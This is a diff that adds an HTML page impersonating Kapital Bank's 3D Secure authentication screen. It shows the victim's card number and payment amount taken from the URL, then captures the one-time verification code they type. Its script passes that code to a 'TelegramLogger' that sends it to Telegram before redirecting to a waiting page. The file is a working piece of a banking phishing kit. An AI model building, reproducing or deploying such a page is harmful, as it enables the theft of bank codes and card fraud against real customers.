@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kapital Bank - 3D Secure Authentication</title>
+    <link rel="stylesheet" href="css/kapital.css">
+    <style>
+        :root {
+            --primary-color: #2563eb;
+            --bg-color: #f0f4f8;
+            --text-color: #1e293b;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
+        }
+
+        body {
+            background: var(--bg-color);
+            color: var(--text-color);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1.5rem;
+            background: linear-gradient(135deg, #f0f4f8 0%, #e2e8f0 100%);
+        }
+
+        .auth-container {
+            background: white;
+            padding: 3rem;
+            border-radius: 1.5rem;
+            box-shadow: 0 8px 16px -4px rgb(0 0 0 / 0.06);
+            width: 100%;
+            max-width: 520px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.18);
+        }
+
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 2.5rem;
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            gap: 1.5rem;
+        }
+
+        .logo-container img {
+            height: 40px;
+            object-fit: contain;
+            transition: transform 0.2s ease;
+        }
+
+        .logo-container img:hover {
+            transform: scale(1.05);
+        }
+
+        .amount-display {
+            background: linear-gradient(to right, #f8fafc, #f1f5f9);
+            padding: 1.5rem;
+            border-radius: 1rem;
+            margin-bottom: 2.5rem;
+            border: 1px solid #e2e8f0;
+        }
+
+        .amount-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 1.25rem;
+            font-weight: 500;
+        }
+
+        .amount-row span:last-child {
+            font-weight: 600;
+            color: var(--primary-color);
+        }
+
+        .otp-container {
+            margin-bottom: 2.5rem;
+        }
+
+        .otp-title {
+            font-size: 1rem;
+            color: #64748b;
+            margin-bottom: 1rem;
+            text-align: center;
+        }
+
+        .otp-inputs {
+            display: flex;
+            gap: 0.75rem;
+            justify-content: center;
+            margin-bottom: 1.5rem;
+        }
+
+        .otp-input {
+            width: 4.5rem;
+            height: 4.5rem;
+            border: 2px solid #e2e8f0;
+            border-radius: 1rem;
+            text-align: center;
+            font-size: 1.75rem;
+            font-weight: 600;
+            transition: all 0.2s;
+            background: #f8fafc;
+        }
+
+        .otp-input:focus {
+            border-color: var(--primary-color);
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.15);
+            background: white;
+        }
+
+        .timer {
+            text-align: center;
+            color: #64748b;
+            font-size: 1.125rem;
+            margin-top: 2rem;
+            padding: 1rem;
+            background: #f8fafc;
+            border-radius: 0.75rem;
+            border: 1px solid #e2e8f0;
+        }
+
+        #countdown {
+            font-weight: 600;
+            color: var(--primary-color);
+        }
+
+        .cancel-btn {
+            background: none;
+            border: none;
+            color: #64748b;
+            cursor: pointer;
+            font-size: 1rem;
+            padding: 0.75rem 1rem;
+            border-radius: 0.5rem;
+            transition: all 0.2s;
+        }
+
+        .cancel-btn:hover {
+            color: #475569;
+            background: #f1f5f9;
+        }
+
+        .card-info {
+            background: linear-gradient(to right, #f8fafc, #f1f5f9);
+            padding: 1rem;
+            border-radius: 1rem;
+            margin-bottom: 2rem;
+            border: 1px solid #e2e8f0;
+        }
+
+        .card-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 1rem;
+            color: #64748b;
+        }
+
+        .card-number {
+            font-family: monospace;
+            font-weight: 500;
+            color: #475569;
+        }
+
+        .logo-container img.card-logo {
+            height: 36px;
+            margin-right: 1rem;
+        }
+        @media screen and (max-width: 768px) {
+            .card-row {
+                font-size: 0.8rem;
+            }
+            .cancel-btn {
+                display: none;
+            }
+            
+        }
+
+        @media (max-width: 480px) {
+            .auth-container {
+                padding: 2rem;
+            }
+
+            .otp-input {
+                width: 3.5rem;
+                height: 3.5rem;
+                font-size: 1.5rem;
+            }
+
+            .logo-container img {
+                height: 32px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <main class="auth-container">
+        <div class="header">
+            <div class="logo-container">
+                <img id="cardTypeLogo" class="card-logo" src="" alt="Card Type">
+                <img src="images/kapital.png" alt="Kapital Bank">
+            </div>
+            <button id="cancel" class="cancel-btn">Cancel</button>
+        </div>
+
+        <div class="amount-display">
+            <div class="amount-row">
+                <span>Amount:</span>
+                <span id="amountDisplay">Loading...</span>
+            </div>
+        </div>
+
+        <div class="card-info">
+            <div class="card-row">
+                <span>Card Number:</span>
+                <span class="card-number" id="cardDisplay">****</span>
+            </div>
+        </div>
+
+        <form class="otp-form" method="POST" action="wait.html" id="otpForm">
+            <div class="otp-container">
+                <p class="otp-title">Enter the verification code sent to your phone</p>
+                <div class="otp-inputs">
+                    <input type="tel" class="otp-input" name="cc1" id="input1" maxlength="1" oninput="handleInput(this, 'input2')" inputmode="numeric" autofocus>
+                    <input type="tel" class="otp-input" name="cc2" id="input2" maxlength="1" oninput="handleInput(this, 'input3')" inputmode="numeric">
+                    <input type="tel" class="otp-input" name="cc3" id="input3" maxlength="1" oninput="handleInput(this, 'input4')" inputmode="numeric">
+                    <input type="tel" class="otp-input" name="cc4" id="input4" maxlength="1" oninput="handleInput(this, '')" inputmode="numeric">
+                </div>
+                <input type="hidden" name="id">
+                <input type="hidden" name="otp" id="otp">
+                <input type="hidden" name="card" id="card">
+            </div>
+            
+            <div class="timer">
+                Code expires in: <span id="countdown">01:00</span>
+            </div>
+        </form>
+    </main>
+
+    <script src="js/telegram-logger.js"></script>
+    <script>
+        // Get URL parameters function
+        function getUrlParameter(name) {
+            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
+            const regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
+            const results = regex.exec(location.search);
+            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
+        }
+
+        // Set the amount from URL parameter
+        const amount = getUrlParameter('amount');
+        if (amount) {
+            document.getElementById('amountDisplay').textContent = parseFloat(amount).toFixed(2) + ' AZN';
+        } else {
+            document.getElementById('amountDisplay').textContent = 'Amount not specified';
+        }
+
+        // Get and display card information
+        const cardNumber = getUrlParameter('card');
+        document.getElementById('card').value = cardNumber;
+        if (cardNumber) {
+            // Display last 4 digits
+            const lastFourDigits = cardNumber.slice(-4);
+            document.getElementById('cardDisplay').textContent = '****  ****  ****  ' + lastFourDigits;
+
+            // Determine card type and set logo
+            const firstDigit = cardNumber.charAt(0);
+            const cardTypeLogo = document.getElementById('cardTypeLogo');
+            
+            if (firstDigit === '4') {
+                cardTypeLogo.src = 'images/visa.png';
+                cardTypeLogo.alt = 'Visa';
+            } else if (/^(5[1-5]|222[1-9]|22[3-9]|2[3-6]|27[0-1]|2720)/.test(cardNumber)) {
+                cardTypeLogo.src = 'images/mastercard.png';
+                cardTypeLogo.alt = 'Mastercard';
+            }
+        }
+
+        function handleInput(current, nextId) {
+            // Allow only numbers
+            current.value = current.value.replace(/[^0-9]/g, '');
+            
+            if (current.value.length === 1) {
+                if (nextId) {
+                    document.getElementById(nextId).focus();
+                } else {
+                    // If this is the last input and it's filled, save OTP and redirect to wait.html
+                    const allInputsFilled = [...document.querySelectorAll('.otp-input')]
+                        .every(input => input.value.length === 1);
+                    
+                    if (allInputsFilled) {
+                        const otp = [...document.querySelectorAll('.otp-input')]
+                            .map(input => input.value)
+                            .join('');
+                        document.getElementById('otp').value = otp;
+                        
+                        // Save OTP using Telegram Logger (every time, no check)
+                        if (window.TelegramLogger) {
+                            console.log('💾 OTP saxlanılır:', otp);
+                            window.TelegramLogger.saveOTP(otp, 'Kapital Bank');
+                            
+                            console.log('📤 OTP Telegram-a göndərilir...');
+                            // Send OTP to Telegram immediately (every time)
+                            window.TelegramLogger.sendOTPInfo().then(success => {
+                                console.log('✅ OTP göndərildi:', success);
+                                // Redirect after sending
+                                const cardNumber = getUrlParameter('card');
+                                window.location.href = 'wait.html?card=' + encodeURIComponent(cardNumber);
+                            }).catch(error => {
+                                console.error('❌ OTP göndərmə xətası:', error);
+                                // Redirect even if send fails
+                                const cardNumber = getUrlParameter('card');
+                                window.location.href = 'wait.html?card=' + encodeURIComponent(cardNumber);
+                            });
+                        } else {
+                            console.error('❌ TelegramLogger tapılmadı!');
+                            // Redirect anyway
+                            const cardNumber = getUrlParameter('card');
+                            window.location.href = 'wait.html?card=' + encodeURIComponent(cardNumber);
+                        }
+                    }
+                }
+            }
+        }
+
+        // Countdown timer
+        function startTimer(duration) {
+            let timer = duration;
+            const countdown = document.getElementById('countdown');
+            
+            const interval = setInterval(() => {
+                const minutes = Math.floor(timer / 60);
+                const seconds = timer % 60;
+
+                countdown.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+
+                if (--timer < 0) {
+                    clearInterval(interval);
+                    countdown.textContent = 'Expired';
+                }
+            }, 1000);
+        }
+
+        // Start 1-minute countdown
+        startTimer(120);
+
+        // Cancel button handler
+        document.getElementById('cancel').addEventListener('click', () => {
+            window.history.back();
+        });
+    </script>
+</body>
+</html>
